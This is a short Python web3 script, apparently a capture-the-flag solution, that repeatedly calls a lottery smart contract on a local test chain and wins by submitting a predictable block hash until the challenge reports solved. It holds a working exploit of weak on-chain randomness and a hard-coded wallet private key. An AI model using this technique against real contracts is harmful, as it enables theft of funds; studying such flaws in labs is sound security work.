from web3 import Web3


### CONSTANTS ###
RPC_URL = "http://localhost:8080/19278d1e-841c-4275-9390-bb4c77db7d84"
PRIVKEY = "20eb155c3424e5e8749953d419cf46e6ace3dcfc61e32727844308c6929c177c"
SETUP_CONTRACT_ADDR = "0x199fA9723E4bC0048433B34A28941Ea87b7ED8Cc"
WALLET_ADDR = "0xAA5AE04A1Fe73F07B71c2767Beb229462016D473"


### INITIALIZATIONS ###
w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = w3.eth.account.from_key(PRIVKEY)
CONTRACT_ABI = [
	{
		"inputs": [],
		"name": "getLotteriesWon",
		"outputs": [
			{
				"internalType": "uint64",
				"name": "",
				"type": "uint64"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "isSolved",
		"outputs": [
			{
				"internalType": "bool",
				"name": "solved",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "bytes32",
				"name": "value",
				"type": "bytes32"
			}
		],
		"name": "lottery",
		"outputs": [
			{
				"internalType": "bool",
				"name": "successful",
				"type": "bool"
			}
		],
		"stateMutability": "payable",
		"type": "function"
	}
]
contract = w3.eth.contract(address=SETUP_CONTRACT_ADDR, abi=CONTRACT_ABI)


while (contract.functions.getLotteriesWon().call() != 10):
	print(f'Lotteries won: {contract.functions.getLotteriesWon().call()}')

	### WITHDRAW ###
	next_hash = w3.eth.get_block(contract.functions.getLotteriesWon().call()).hash
	transaction = contract.functions.lottery(next_hash).build_transaction({
		'from': WALLET_ADDR,
		'nonce': w3.eth.get_transaction_count(WALLET_ADDR),
		'chainId': w3.eth.chain_id,
		'value': w3.to_wei(1, 'wei'),
	})
	signed_transaction = w3.eth.account.sign_transaction(transaction, PRIVKEY)
	transaction_hash = w3.eth.send_raw_transaction(signed_transaction.raw_transaction)
	transaction_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)

	print(f"Transaction hash: {transaction_hash.hex()}")
	print(f"Transaction status: {transaction_receipt.status}")
	print(dict(transaction_receipt))


	print(f"Is solved: {contract.functions.isSolved().call()}")